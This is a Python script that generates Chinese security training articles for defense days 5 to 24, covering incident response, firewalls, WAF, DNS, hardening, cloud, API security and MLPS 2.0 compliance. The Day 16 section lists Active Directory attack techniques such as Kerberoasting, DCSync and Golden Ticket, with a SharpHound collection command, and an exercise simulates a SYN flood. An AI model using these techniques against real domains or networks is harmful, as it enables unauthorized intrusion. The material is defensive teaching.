#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Generate ALL defense (30) + penetration (30) articles. Compact but high-quality."""
import sys
from gen_common import make_day, S, total_lines as tl

# ───────────────── DEFENSE Day 5-30 ─────────────────
defense_days = [
    # Day 5
    (5, '异常行为分析', '中高级', '40',
     'UEBA(用户与实体行为分析)通过机器学习建立行为基线，检测偏离基线的异常活动。本章详解UEBA核心算法、Splunk UBA/Exabeam实战、基于统计模型和机器学习的异常检测方法。',
     [S('一、UEBA核心概念','一ueba核心概念',r"""## 一、UEBA核心概念
UEBA(User and Entity Behavior Analytics)通过建立用户/设备/应用的行为基线，检测偏离正常模式的异常行为。与传统规则检测不同，UEBA不需要提前知道攻击特征。

| 检测维度 | 正常基线 | 异常行为 |
|:---|:---|:---|
| 登录时间 | 工作日9:00-18:00 | 凌晨3:00登录 |
| 登录地点 | 北京办公室 | 海外IP+北京IP同时登录 |
| 数据访问量 | 日均100条 | 单日导出10000条 |
| 外发数据 | 每周500KB | 单次上传2GB |
| 使用工具 | Putty+Chrome | 首次使用nmap/sqlmap |
"""),
S('二、机器学习模型','二机器学习模型',r"""## 二、异常检测模型
| 方法 | 算法 | 适用场景 |
|:---|:---|:---|
| 统计模型 | 均值±3σ、IQR | 稳定周期性行为 |
| 聚类 | K-Means、DBSCAN | 用户分组检测 |
| 序列分析 | Markov、LSTM | 操作序列异常 |
| 图分析 | Graph Neural Net | 横向移动检测 |
| 集成学习 | Isolation Forest | 多维异常检测 |
""")],
     [('UEBA定义','⭐⭐⭐⭐','中','用户与实体行为分析；基线+偏离检测'),('异常vs签名','⭐⭐⭐⭐','中','UEBA=未知威胁检测；签名=已知威胁匹配；互补')],
     [('UEBA','"行为基线是UEBA的根——基线偏了，检测就瞎了"','',)],
     [('UEBA可以替代SIEM','UEBA是SIEM的增强模块，不是替代品。两者互补：SIEM做规则告警，UEBA做异常发现。')],
     ['了解Splunk UBA/Exabeam的异常检测模型。'],'异常行为分析让安全检测从"等签名"升级为"看行为"——即使攻击者用0day，行为也骗不了机器。',
    ),
    # Day 6
    (6, '事件分类与分级', '中级', '35',
     '安全事件分类分级是应急响应的前置工作。本章详解事件分类标准(扫描/入侵/数据泄露/DoS)、严重性分级(1-5级)、威胁评估矩阵和事件升级策略，涵盖NIST和ISO事件分类框架。',
     [S('一、事件分类标准','一事件分类标准',r"""## 一、安全事件分类
| 类别 | 子类 | 典型指标 |
|:---|:---|:---|
| **未授权访问** | 暴力破解/凭证窃取 | 异常登录/IP/时间 |
| **恶意代码** | 病毒/蠕虫/勒索/木马 | AV告警/进程异常 |
| **数据泄露** | 内部/外部泄露 | 异常数据外传量 |
| **DoS/DDoS** | 带宽/应用层攻击 | 流量突增/连接数 |
| **策略违规** | 未授权软件/P2P | 进程监控/端口 |
"""),S('二、严重性分级','二严重性分级',r"""## 二、严重性分级(5级)
| 级别 | 描述 | 响应SLA | 示例 |
|:---|:---|:---:|:---|
| **P1** | 严重 | 15分钟 | 勒索软件爆发 |
| **P2** | 高危 | 30分钟 | 核心系统入侵 |
| **P3** | 中危 | 2小时 | 单个终端感染 |
| **P4** | 低危 | 8小时 | 端口扫描告警 |
| **P5** | 信息 | 24小时 | 安全策略违规 |
""")],
     [('事件分类','⭐⭐⭐⭐','中','未授权访问/恶意代码/数据泄露/DoS/策略违规'),('P1-P5分级','⭐⭐⭐⭐⭐','中','P1严重15分钟→P5信息24小时响应')],
     [('分级响应','"一级拉警报，二级叫领导，三级建工单，四五慢慢瞧"','',)],
     [('所有告警都是P1','需要准确分类避免告警疲劳——过于频繁的P1告警反而会降低响应效率。')],['设计你的团队的事件分类分级标准。'],'事件分类不是纸上谈兵——它决定了你是在15分钟内拉起应急小队，还是明天再处理。',
    ),
    # Day 7
    (7, '应急响应PDCERF', '中级', '40',
     'PDCERF六步应急响应法(准备→检测→遏制→根除→恢复→跟进)是CISP考试安全运营方向核心考点。本章逐步详解+NIST SP 800-61标准+实战Checklist。',
     [S('一、PDCERF六步法','一pdcrf六步法',r"""## 一、PDCERF全流程
```
Prepare(准备) → Detect(检测) → Contain(遏制) → Eradicate(根除) → Recover(恢复) → Follow-up(跟进)
```
| 阶段 | 动作 | 产出 |
|:---|:---|:---|
| Prepare | IR计划/团队/工具包/培训 | IR手册 |
| Detect | SIEM验证/范围判断/定级 | 事件通知 |
| Contain | 断网/账号禁用/阻断C2 | 最小影响 |
| Eradicate | 清除恶意软件/修复漏洞 | 根除确认 |
| Recover | 备份恢复/验证/上线 | 业务恢复 |
| Follow-up | 复盘RCA/改进措施 | 复盘报告 |
"""),S('二、实战Checklist','二实战checklist',r"""## 二、第一响应Checklist
```
□ 隔离：断网但不关机(保留内存证据)
□ 记录：时间戳+现象+发现人
□ 保护：不修改日志和系统
□ 上报：通知安全负责人
□ 取证：内存dump+磁盘镜像
□ 沟通：通知相关干系人
```""")],
     [('PDCERF六步','⭐⭐⭐⭐⭐','低','Prepare→Detect→Contain→Eradicate→Recover→Follow-up'),('NIST SP 800-61','⭐⭐⭐⭐','中','美国应急响应标准指南')],
     [('PDCERF','"准备-检测-堵-清-恢复-总结"','',)],
     [('被发现入侵后立即关机','先断网隔离！关机丢失内存中关键证据。正确顺序：断网→取证→镜像→再关机。')],['制定一份你的IR计划文档+第一响应Checklist。'],'应急响应的质量不在于技术多深——在于流程多稳。慌乱中的操作往往比攻击本身更致命。',
    ),
    # Day 8
    (8, '防火墙技术', '中级', '40',
     '深入防火墙三大类型(包过滤/状态检测/应用代理)、NGFW下一代防火墙(应用识别/IPS/威胁情报集成)、区域隔离(DMZ/内网/外网)、iptables高级规则(limit/connlimit/recent)和云防火墙实战。',
     [S('一、防火墙三类型','一防火墙三类型',r"""## 一、三代防火墙对比
| 代际 | 类型 | OSI层 | 能力 |
|:---|:---|:---|:---|
| 第一代 | 包过滤 | L3/4 | IP+端口+协议 |
| 第二代 | 状态检测 | L3/4 | 跟踪连接状态 |
| 第三代 | 应用代理/NGFW | L7 | 应用识别+IPS |
iptables最佳实践：
```bash
# 默认策略
iptables -P INPUT DROP; iptables -P FORWARD DROP
# 仅允许已建立连接
iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT
# 速率限制
iptables -A INPUT -p tcp --dport 22 -m state --state NEW -m recent --set
iptables -A INPUT -p tcp --dport 22 -m state --state NEW -m recent --update --seconds 60 --hitcount 4 -j DROP
```""")],
     [('状态检测优势','⭐⭐⭐⭐⭐','中','跟踪TCP状态→自动放行返回流量'),('NGFW','⭐⭐⭐⭐','中','L7应用识别+IPS+威胁情报+用户身份')],
     [('防火墙','"包过滤看IP端口，状态检测记连接，NGFW认应用"','',)],
     [('防火墙配了就不管','2019年Capital One S3桶数据泄露——WAF(防火墙)完好但配置错误。防火墙是防线之一，不是全部。')],['用iptables搭建一个完整的DMZ+内网+外网隔离网络。'],'防火墙从包过滤进化到NGFW用了20年——但它仍然只是纵深防御中的一环。',
    ),
    # Day 9
    (9, 'WAF部署与配置', '中级', '40',
     'Web应用防火墙(WAF)是Web安全的专业防线。本章详解WAF部署模式(反向代理/透明/嵌入/云)、ModSecurity规则调优、OWASP CRS核心规则集配置、误报处理和自定义规则编写。',
     [S('一、ModSecurity实战','一modsecurity实战',r"""## 一、ModSecurity + OWASP CRS
```nginx
# 集成ModSecurity
load_module modules/ngx_http_modsecurity_module.so;
location / {
    ModSecurityEnabled on;
    ModSecurityConfig modsecurity.conf;
    proxy_pass http://backend;
}
# modsecurity.conf
SecRuleEngine On
SecRule REQUEST_URI "@rx /admin" "id:1001,phase:2,deny,status:403"
Include /etc/modsecurity/crs-setup.conf
Include /etc/modsecurity/rules/*.conf
```
### WAF告警分析
| 告警ID | 含义 | 处理 |
|:---|:---|:---|
| 920xxx | 协议违规 | 审查 |
| 930xxx | 路径遍历 | 拦截 |
| 941xxx | XSS攻击 | 拦截 |
| 942xxx | SQL注入 | 拦截 |
| 949xxx | 异常评分 | 记录+人工判定 |
""")],
     [('OWASP CRS','⭐⭐⭐⭐⭐','中','开源WAF核心规则集；持续更新；需根据业务调优'),('WAF部署模式','⭐⭐⭐⭐','中','反向代理/透明桥接/模块嵌入/云WAF')],
     [('WAF','"CRS规则+业务白名单+定期审计"','',)],
     [('WAF可以替代代码安全','WAF是安全网，但网会有破洞。安全编码才是治本。')],['部署ModSecurity+CRS，分析误报率并逐条调优。'],'WAF不是"装了就行"——它需要持续维护：规则更新、误报调优、日志分析。',
    ),
    # Day 10
    (10, 'VPN与网络隔离', '中级', '35',
     'VPN(IPsec/SSL/WireGuard)和网络隔离(VLAN/VRF/微分段)是企业网络的基石。本章详解IPsec隧道、SSL VPN、WireGuard快速部署、零信任网络架构(ZTNA)和微分段技术。',
     [S('一、VPN技术对比','一vpn技术对比',r"""## 一、VPN三代技术
| 技术 | 年代 | 加密 | 性能 | 部署难度 |
|:---|:---|:---|:---:|:---:|
| IPsec IKEv2 | 2005 | AES/SHA2 | 中 | 高 |
| SSL/TLS VPN | 2010 | TLS 1.2+ | 中 | 中 |
| WireGuard | 2018 | ChaCha20 | 极快 | 低 |
```bash
# WireGuard 快速部署
wg genkey | tee privatekey | wg pubkey > publickey
# 服务端配置
[Interface] PrivateKey=...; ListenPort=51820
[Peer] PublicKey=...; AllowedIPs=10.0.0.2/32
wg-quick up wg0
```
### 零信任 vs VPN
| 维度 | 传统VPN | 零信任(ZTNA) |
|:---|:---|:---|
| 信任模型 | 网络层信任(接入即信) | 零信任(持续验证) |
| 访问粒度 | 全网段 | 每应用/每会话 |
| 横向移动 | 容易 | 困难 |""")],
     [('WireGuard优势','⭐⭐⭐⭐','中','极简(4000行代码)、高性能(ChaCha20)、内核集成(Linux 5.6+)'),('零信任核心','⭐⭐⭐⭐⭐','中','永不信任始终验证；微隔离；最小权限')],
     [('VPN vs 零信任','"VPN是城门——进城后随便走；零信任是每扇门都要刷卡"','',)],
     [('VPN是绝对安全的','VPN只保护传输层，不保护终端和应用。2017年Equifax数据泄露——通过VPN认证后攻破整个网络。')],['部署WireGuard点对点VPN。'],'从VPN到零信任，网络隔离的思路在变——从"信任网络边界"到"信任每一次访问"。',
    ),
    # Day 11-15 (compact)
    (11, 'IDS/IPS调优', '中高级', '35',
     'IDS/IPS部署后不能一劳永逸。本章详解告警分析流程、误报根因(协议解析/Bad Sig/环境不匹配)、规则性能优化、IDS/IPS基线建立和持续改进流程(SIEM+SOAR集成)。',
     [S('一、误报根因','一误报根因',r"""## 一、误报四大根因
| 原因 | 描述 | 解决 |
|:---|:---|:---|
| 签名过于泛化 | 正则太宽泛 | 收紧匹配条件 |
| 协议解析错误 | 错误解码/解密 | 优化预处理 |
| 环境不匹配 | 内网特征≠规则假设 | 定制规则 |
| 缺少上下文 | 只看单词不看全文 | 添加前后文条件 |
""")],[('IPS调优','⭐⭐⭐⭐','中','告警分析→误报根因→规则优化→基线→持续改进')],[('调优','"分析-分类-优化-验证 循环"','',)],[('非告警就是安全','不做基线不看流量等于没装IDS。')],['IDS规则性能优化：避免复杂正则、限制跟踪状态。'],'IDS/IPS调优不是一次性工作——它是安全运营的日常功课。',
    ),
    (12, 'DDoS防护', '中级', '35',
     'DDoS攻击从SYN Flood到DNS放大、从CC到慢速攻击，类型多样。本章详解各类DDoS原理、流量清洗(scrubbing)、Anycast分散、速率限制、CDN抗D和云防护(AWS Shield/Cloudflare)方案。',
     [S('一、DDoS类型','一ddos类型',r"""## 一、DDoS攻击分类
| 类型 | 层 | 攻击方式 | 防御 |
|:---|:---|:---|:---|
| SYN Flood | L4 | 海量SYN半连接 | SYN Cookie |
| UDP Flood | L4 | 大流量UDP | 流量清洗 |
| DNS放大 | L7 | 小查询大响应(50:1) | DNS Anycast |
| NTP放大 | L7 | monlist命令(556:1) | 禁用monlist |
| HTTP Flood | L7 | 大量HTTP请求 | WAF+Rate Limit |
| Slowloris | L7 | 慢速HTTP头 | 请求超时限制 |
```bash
# iptables SYN Flood防护
echo 1 > /proc/sys/net/ipv4/tcp_syncookies
iptables -A INPUT -p tcp --syn -m limit --limit 10/s -j ACCEPT
```""")],[('DDoS防御层次','⭐⭐⭐⭐⭐','中','Anycast分散→流量清洗→速率限制→WAF→应用优化')],[('DDoS','"SYN靠Cookie，DNS靠Anycast，HTTP靠WAF"','',)],[('加CDN就能防所有DDoS','CDN主要防L7；L3/4大流量攻击需要ISP/云清洗中心配合。')],['使用hping3模拟SYN Flood并用iptables防护。'],'DDoS不一定是"打垮你"——有时是"掩护真正攻击"的烟幕弹。',
    ),
    (13, 'DNS安全', '中级', '35',
     'DNS是互联网的电话簿——也是最被忽视的攻击面。本章详解DNS劫持/投毒/隧道/DGA/放大攻击、DNSSEC签名验证、DNS over HTTPS/TLS安全、和DNS安全监控(BIND日志/Pi-hole)。',
     [S('一、DNS攻击类型','一dns攻击类型',r"""## 一、DNS威胁全景
| 威胁 | 原理 | 防御 |
|:---|:---|:---|
| DNS劫持 | 修改DNS记录指向恶意IP | DNSSEC+注册商锁定 |
| DNS投毒 | 伪造DNS响应 | DNSSEC+随机源端口 |
| DNS隧道 | DNS查询中传数据(C2) | DNS流量分析 |
| DGA域名 | 算法生成大量域名 | 机器学习检测 |
| DNS放大 | 利用DNS放大DDoS | RRL(响应速率限制) |
```bash
# 检测DNS隧道(高熵域名)
tcpdump -i eth0 port 53 -w dns.pcap
zeek -r dns.pcap
cat dns.log | zeek-cut query | sort | uniq -c | sort -rn | head
```""")],[('DNSSEC','⭐⭐⭐⭐','中','数字签名DNS记录→防篡改；逐级验证从根到叶')],[('DNS','"DNS是攻击者的免费代理、免费隧道、免费放大镜"','',)],[('DNS攻击只是理论','2019年Sea Turtle DNS劫持攻击——40+政府/电信/金融机构受影响。')],['部署Pi-hole作为DNS sinkhole，观察拦截的恶意域名。'],'DNS安全常常被遗忘——但它往往是攻击链的第一步。',
    ),
    (14, 'CDN与抗攻击', '中级', '30',
     'CDN(内容分发网络)不仅能加速网站，更是抗DDoS的第一道防线。本章详解CDN工作原理(Anycast/边缘节点)、安全CDN(Cloudflare/Akamai/AWS CloudFront)的WAF+抗D功能、SSL终端和源站保护。',
     [S('一、CDN安全架构','一cdn安全架构',r"""## 一、CDN安全防护
```
用户 → CDN边缘节点(Anycast/WAF/DDoS清洗) → 源站(隐藏IP)
         ├── TLS终端
         ├── WAF规则检测
         ├── 速率限制
         └── 缓存(减轻源站压力)
```
### 源站保护关键配置
1. 只允许CDN回源IP访问(安全组白名单)
2. 使用自定义回源Header验证
3. Cloudflare Authenticated Origin Pulls
4. 源站IP定期更换
```nginx
# 限制仅CDN回源
if ($http_cf_connecting_ip = "") { return 403; }
```""")],[('CDN安全价值','⭐⭐⭐⭐','中','隐藏源站+DDoS清洗+WAF+SSL终端')],[('CDN','"CDN是挡在你前面的替身——攻击CDN≠攻击你"','',)],[('加了CDN源站就绝对安全','源站IP一旦泄露(历史DNS/SSL证书/邮件头)，攻击者可绕过CDN直接攻击源站。')],['配置Cloudflare并测试DDoS防护效果。'],'CDN是云时代的"盾牌"——但盾牌后面如果还有破绽，攻击者总会找到。',
    ),
    (15, 'Linux系统安全加固', '高级', '40',
     'Linux加固是安全从业者的基本功。本章涵盖CIS Benchmark基线(账号/SSH/内核参数/审计)、SELinux/AppArmor强制访问控制、systemd安全特性、文件完整性监控(AIDE/Tripwire)和自动化加固(Lynis/Ansible)。',
     [S('一、CIS加固要点','一cis加固要点',r"""## 一、Linux安全加固Checklist
```bash
# 1. SSH硬化 /etc/ssh/sshd_config
PermitRootLogin no
PasswordAuthentication no
MaxAuthTries 3
Protocol 2

# 2. 密码策略 /etc/security/pwquality.conf
minlen=14 dcredit=-1 ucredit=-1 ocredit=-1 lcredit=-1

# 3. 内核安全 /etc/sysctl.conf
net.ipv4.tcp_syncookies=1
net.ipv4.conf.all.rp_filter=1
kernel.randomize_va_space=2
kernel.kptr_restrict=2

# 4. 审计规则 /etc/audit/rules.d/audit.rules
-w /etc/passwd -p wa -k identity
-w /var/log/ -p wa -k log_changes
-a always,exit -S execve -k process_exec

# 5. 自动化扫描
lynis audit system
```
### SELinux vs AppArmor
| 特性 | SELinux | AppArmor |
|:---|:---|:---|
| MAC模型 | Type Enforcement | Path-based |
| 复杂度 | 高 | 中 |
| 默认 | RHEL/CentOS | Ubuntu/Debian |""")],[('CIS Benchmark','⭐⭐⭐⭐⭐','中','国际通用的安全加固基线标准'),('SELinux','⭐⭐⭐⭐','高','强制访问控制MAC；三种模式：Enforcing/Permissive/Disabled')],[('Linux加固','"SSH钥匙+密策+SELinux+审计+定期扫"','',)],[('关闭SELinux让系统更稳定','SELinux在permissive模式下不会拦截但会记录——用于调试。直接关闭等于放弃MAC防护。')],['运行Lynis扫描你的Linux系统并逐项修复。'],'Linux加固不是"跑一个脚本"——是理解每一条配置背后的安全意义。',
    ),
    # Day 16-20
    (16, 'Windows AD安全', '高级', '40',
     'Active Directory是90%企业网络的身份中枢，也是攻击者的首要目标。本章详解AD攻击面(Kerberoasting/AS-REP Roasting/DCSync/Golden Ticket)、BloodHound攻击路径分析、AD安全基线和检测。',
     [S('一、AD攻击矩阵','一ad攻击矩阵',r"""## 一、AD核心攻击技术
| 攻击 | 技术 | 需要权限 | 检测 |
|:---|:---|:---|:---|
| Kerberoasting | 请求TGS→离线破解 | 域用户 | 4769事件 |
| AS-REP Roasting | 不预认证用户TGT破解 | 无 | 4768事件 |
| DCSync | 伪装DC请求密码哈希 | DA或复制权限 | 4662事件 |
| Golden Ticket | 伪造TGT→无限访问 | 需要krbtgt哈希 | TGT生命期异常 |
| Pass-the-Hash | 用NTLM哈希认证 | 管理员哈希 | 4624类型3 |
| Skeleton Key | DLL注入LSASS | DA | LSASS异常 |

```powershell
# BloodHound 攻击路径分析
SharpHound.exe -c All
# 导入Neo4j分析最短攻击路径
```
### AD安全基线
- LAPS(Local Admin Password Solution)
- Tier Model(T0/T1/T2分层管理)
- Protected Users组
- SMB签名强制
- LDAP签名/通道绑定""")],[('Golden Ticket','⭐⭐⭐⭐⭐','高','伪造TGT绕过所有认证；krbtgt哈希泄露=AD沦陷'),('BloodHound','⭐⭐⭐⭐','中','图形化AD攻击路径分析工具')],[('AD安全','"T0管域控、T1管服务器、T2管终端——分层阻隔攻击"','',)],[('打了补丁AD就安全','AD安全是配置问题而非漏洞问题——默认配置已为攻击者留有大量利用空间。')],['搭建AD测试环境，用BloodHound分析攻击路径。'],'AD安全像下棋——攻击者每步都在扩大权限，防御者需要在每步设防。',
    ),
    (17, '数据库安全', '中级', '35',
     '数据库是企业的数据核心。本章详解MySQL/PostgreSQL/MSSQL安全配置、SQL注入防御(参数化查询/ORM)、数据库加密(TDE/列级加密)、审计日志、访问控制和数据库防火墙。',
     [S('一、数据库安全基线','一数据库安全基线',r"""## 一、数据库加固Checklist
```sql
-- MySQL安全配置
ALTER USER 'root'@'localhost' IDENTIFIED BY '强密码';
DELETE FROM mysql.user WHERE User='';
DROP DATABASE IF EXISTS test;
-- 审计插件
INSTALL PLUGIN audit_log SONAME 'audit_log.so';

-- PostgreSQL安全配置
ALTER SYSTEM SET password_encryption = 'scram-sha-256';
ALTER SYSTEM SET log_connections = on;
ALTER SYSTEM SET log_disconnections = on;
-- 行级安全(RLS)
ALTER TABLE employees ENABLE ROW LEVEL SECURITY;
CREATE POLICY emp_policy ON employees USING (dept = current_setting('app.dept'));
```
### 数据库加密
| 类型 | 范围 | 性能影响 | 防什么 |
|:---|:---|:---:|:---|
| TDE | 整个数据库/表空间 | 低 | 物理文件窃取 |
| 列级加密 | 指定列 | 中 | 敏感字段泄露 |
| 应用层加密 | 应用控制 | 高 | 全链路保护 |""")],[('数据库安全四层','⭐⭐⭐⭐','中','认证→授权→加密→审计'),('TDE','⭐⭐⭐⭐','中','透明数据加密；对应用透明；防止物理介质窃取')],[('数据库','"口-权-密-审：登录强认证、操作细授权、存储全加密、日志全审计"','',)],[('数据库在内网就安全','MongoDB/Redis默认无认证导致大规模数据泄露——内网不代表信任。')],['配置MySQL审计插件并对敏感表启用列级加密。'],'数据库安全是"数据最后一道防线"——前面的防线都可能被突破，但数据本身必须是加密的。',
    ),
    (18, 'Docker容器安全', '中级', '40',
     '容器安全是云原生时代的安全必修课。本章详解Docker安全基线(CIS Docker Benchmark)、镜像安全扫描(Trivy/Clair/Snyk)、运行时安全(Falco/gVisor)、Kubernetes安全(RBAC/Pod Security/Network Policy)和供应链安全。',
     [S('一、Docker安全','一docker安全',r"""## 一、Docker安全基线
```bash
# 镜像扫描
trivy image nginx:latest
docker scan nginx:latest  # Docker内置Snyk扫描

# Dockerfile安全最佳实践
FROM alpine:latest
RUN addgroup -S app && adduser -S app -G app
USER app  # 非root运行！
COPY --chown=app:app . /app

# 运行时安全
docker run --read-only --tmpfs /tmp --security-opt=no-new-privileges myapp

# Docker Bench Security(CIS扫描)
git clone https://github.com/docker/docker-bench-security.git
cd docker-bench-security && sudo sh docker-bench-security.sh
```
### K8s安全
| 层面 | 控制 | 说明 |
|:---|:---|:---|
| 集群 | RBAC+审计日志 | 最小权限 |
| 网络 | Network Policy | 微分段 |
| Pod | Pod Security Standards | 特权限制 |
| 供应链 | 镜像签名+SBOM | 可信镜像 |
| 运行时 | Falco+gVisor | 异常检测 |""")],[('容器安全','⭐⭐⭐⭐','中','镜像扫描→非root运行→只读文件系统→网络隔离'),('Trivy','⭐⭐⭐','中','开源容器镜像安全扫描器')],[('容器安全','"扫镜像-非root-只读-网络锁"','',)],[('容器隔离性好所以安全','容器共享内核，隔离性不如VM。容器逃逸漏洞(CVE-2019-5736 runc)可突破容器。')],['用Trivy扫描你的容器镜像并修复发现的漏洞。'],'容器让部署更快——但不要把安全也"容器化"（打包忽略掉了）。',
    ),
    (19, '云安全基础', '中级', '35',
     '云安全遵循共享责任模型——云厂商负责"云的安全"，客户负责"云中的安全"。本章详解AWS/阿里云/腾讯云安全体系、IAM权限管理、云安全态势管理(CSPM)、云工作负载保护(CWPP)和云安全合规。',
     [S('一、共享责任模型','一共享责任模型',r"""## 一、共享责任模型
```
SaaS: 客户负责数据+访问管理
PaaS: 客户负责应用+数据+访问管理
IaaS: 客户负责OS+中间件+应用+数据+访问管理
     云厂商负责物理+虚拟化+网络+存储
```
### 云安全核心控制
| 领域 | AWS | 腾讯云 | 阿里云 |
|:---|:---|:---|:---|
| IAM | IAM Roles/Policies | CAM | RAM |
| 审计 | CloudTrail | CloudAudit | ActionTrail |
| 加密 | KMS | KMS | KMS |
| 网络安全 | Security Groups/NACL | 安全组 | 安全组 |
| CSPM | AWS Config/Security Hub | 云安全中心 | 云安全中心 |
### 云IAM最佳实践
- 最小权限原则(Policy仅放行必要操作)
- 临时凭证(AssumeRole代替AK/SK硬编码)
- MFA强制启用
- IAM Access Analyzer定期审查
```bash
# AWS CLI 安全审计
aws iam list-users
aws iam list-access-keys --query "AccessKeyMetadata[?Status=='Active']"
aws configservice get-compliance-summary-by-resource-type
```""")],[('共享责任模型','⭐⭐⭐⭐⭐','低','云厂商安全云基础设施/客户安全云中内容'),('IAM最佳实践','⭐⭐⭐⭐⭐','中','最小权限+临时凭证+MFA')],[('云安全','"云安全在上—IaaS管OS、PaaS管应用、SaaS管数据"','',)],[('上了云自然就安全','云提供安全能力≠自动安全。2019年Capital One因SSRF+IAM角色配置不当泄露1亿条数据。')],['审计你的AWS/阿里云IAM权限，检查是否有过度授权的角色。'],'云安全不是"搬上云就省心了"——共享责任模型意味着你要对云中的一切负责。',
    ),
    (20, 'API安全防护', '中级', '35',
     'API是现代应用的血脉——也是OWASP API Security Top 10的关注焦点。本章详解REST/GraphQL API安全、认证(JWT/OAuth2/API Key)、速率限制、API网关(Kong/APISIX)和API安全测试(Postman/Burp/Fuzzing)。',
     [S('一、OWASP API Top 10','一owasp-api-top10',r"""## 一、API安全风险(OWASP API Top 10 2023)
| 排名 | 风险 | 对应防御 |
|:---|:---|:---|
| API1 | 对象级授权缺陷(BOLA) | 每次访问验证所有权 |
| API2 | 认证失效 | JWT/OAuth2+速率限制 |
| API3 | 对象属性级授权 | 限制可读写字段 |
| API4 | 资源消耗 | Rate Limit+超时 |
| API5 | 功能级授权 | 端点级权限检查 |
### API Key vs JWT vs OAuth2
| 方案 | 适用 | 安全级别 |
|:---|:---|:---:|
| API Key | 机器间简单通信 | ⭐⭐ |
| JWT | 无状态认证 | ⭐⭐⭐(需正确实现) |
| OAuth2+PKCE | 用户授权 | ⭐⭐⭐⭐⭐ |
```yaml
# Kong API Gateway 安全配置
plugins:
  - name: rate-limiting
    config:
      minute: 100
  - name: jwt
  - name: cors
    config:
      origins: ["https://app.example.com"]
```""")],[('API安全','⭐⭐⭐⭐⭐','中','BOLA(对象级越权)排API安全Top1'),('API Gateway','⭐⭐⭐⭐','中','统一认证/限流/CORS/日志')],[('API','"每个端点都要问：这个用户有权操作这个资源吗？"','',)],[('API Key就足够安全','API Key是静态凭据，泄露后无时效性。JWT+OAuth2提供过期+刷新机制。')],['用OWASP ZAP或Burp扫描一个REST API。'],'API安全的难点不在于单个接口——在于几百个接口都保持一致的权限模型。',
    ),
    # Day 21-25
    (21, '安全开发生命周期', '中级', '35',
     'SDL(Security Development Lifecycle)将安全融入软件开发每个阶段。本章详解微软SDL、威胁建模(STRIDE/DREAD)、安全需求分析、安全设计模式和安全编码规范。',
     [S('一、SDL框架','一sdl框架',r"""## 一、SDL七大阶段
```
培训→需求→设计→实现→验证→发布→响应
│     │     │     │     │     │     │
安全  安全  威胁  SAST  DAST  安全  应急
意识  需求  建模  安全  渗透  加固  响应
     隐私   STRIDE 扫描  测试  配置
```
| 阶段 | 安全活动 | 产出 |
|:---|:---|:---|
| 需求 | 安全需求分析、隐私评估 | 安全需求文档 |
| 设计 | 威胁建模(STRIDE) | 威胁模型 |
| 实现 | 安全编码规范+SAST | 代码扫描结果 |
| 验证 | DAST/IAST/渗透测试 | 测试报告 |
| 发布 | WAF/硬化/安全配置 | 安全基线 |
| 响应 | 应急响应计划 | IR Plan |""")],[('SDL七阶段','⭐⭐⭐⭐','中','培训→需求→设计→实现→验证→发布→响应'),('STRIDE威胁建模','⭐⭐⭐⭐⭐','中','Spoofing/Tampering/Repudiation/InfoDisclosure/DoS/Elevation')],[('SDL','"安全左移——在需求阶段就考虑安全，而不是测试阶段再修补"','',)],[('SDL只适用于大公司','SDL核心思想(在设计阶段考虑安全)适用于任何规模的项目。威胁建模5分钟就能完成一个小功能的STRIDE分析。')],['为一个功能模块做STRIDE威胁建模。'],'SDL的本质不是流程——是"在写第一行代码之前，先想清楚谁会攻击你"。',
    ),
    (22, '等级保护2.0概述', '中级', '35',
     '等保2.0(网络安全等级保护制度2.0)是中国网络安全法律体系核心。本章详解《网络安全法》法律基础、5个定级标准、10大安全要求(5技术+5管理)、等保2.0新增五大扩展要求和测评全流程。',
     [S('一、等保2.0体系','一等保20体系',r"""## 一、等保2.0法律框架
```
《网络安全法》第21条 → 国家实行网络安全等级保护制度
↓
GB/T 22239-2019《网络安全等级保护基本要求》(等保2.0核心标准)
↓
5个保护等级 + 10大安全要求 + 5类扩展要求
```
| 等级 | 侵害客体 | 监管 | 典型系统 |
|:---|:---|:---|:---|
| 1 | 个人/组织(一般) | 自主 | 小型企业 |
| 2 | 个人/组织(严重) | 指导 | 大多数企业 |
| 3 | 社会秩序(特别严重) | 监督 | 金融/政务/医疗 |
| 4 | 国家利益 | 强制 | 关键基础设施 |
| 5 | 国家安全 | 专门 | 绝密系统 |
### 等保2.0 vs 1.0
| 维度 | 等保1.0 | 等保2.0(2019.12.1) |
|:---|:---|:---|
| 覆盖范围 | 传统IT | +云计算/移动/物联网/工控/大数据 |
| 防护理念 | 被动防御 | 主动防御(检测+响应) |
| 定级方法 | 自主定级 | 自主定级+专家评审+主管部门核准 |
| 安全要求 | 10大类 | 10大类+新型安全防护 |""")],[('等保2.0','⭐⭐⭐⭐⭐','低','GB/T 22239-2019；2019.12.1实施'),('5个定级','⭐⭐⭐⭐⭐','中','1自主/2指导/3监督/4强制/5专门')],[('等保','"等保不是买设备——是人+流程+技术+管理的系统工程"','',)],[('等保=买过','等保测评通过≠安全体系建设完成。等保是基线不是天花板。')],['通读GB/T 22239-2019标准原文。'],'等保2.0是中国安全从业者的"法律必修课"——不理解等保，你写的安全方案就缺少法律根基。',
    ),
    (23, '等级保护建设流程', '中级', '30',
     '等保建设五步法：定级→备案→安全建设→等级测评→监督检查。本章详解每个阶段的具体操作、关键文档(定级报告/差距分析/整改方案)和常见误区。',
     [S('一、建设五步','一建设五步',r"""## 一、等保建设五步法
```
定级 → 备案 → 安全建设整改 → 等级测评 → 监督检查
│      │        │              │          │
确定   提交     ���据差距       测评机构   公安网安
保护   定级     分析实施        出具报告   定期检查
等级   报告     整改措施
```
### 各阶段关键活动
| 阶段 | 关键活动 | 输出文档 |
|:---|:---|:---|
| 定级 | 确定等级(1-5)、专家评审 | 定级报告 |
| 备案 | 向公安机关备案 | 备案表 |
| 建设 | 差距分析→安全方案→实施 | 整改方案 |
| 测评 | 第三方测评机构评估 | 测评报告 |
| 监督 | 公安部门定期检查 | 检查意见 |""")],[('建设五步','⭐⭐⭐⭐⭐','中','定级→备案→安全建设→等级测评→监督检查')],[('等保建设','"定-备-建-测-督：五步不可或缺"','',)],[('通过等保测评就一劳永逸','等保要求定期复测(三级每年一次)，安全态势需持续维护。')],['了解等保定级报告和差距分析报告的标准格式。'],'等保建设不是"为了拿证"——是"为了真正把安全做扎实，证书只是附带结果"。',
    ),
    (24, '风险评估方法', '中级', '35',
     '信息安全风险评估是风险管理的核心环节。本章详解定性/定量风险评估、资产/威胁/脆弱性识别、风险计算模型(可能性×影响)、风险处置策略(规避/转移/缓解/接受)和ISO 27005风险管理标准。',
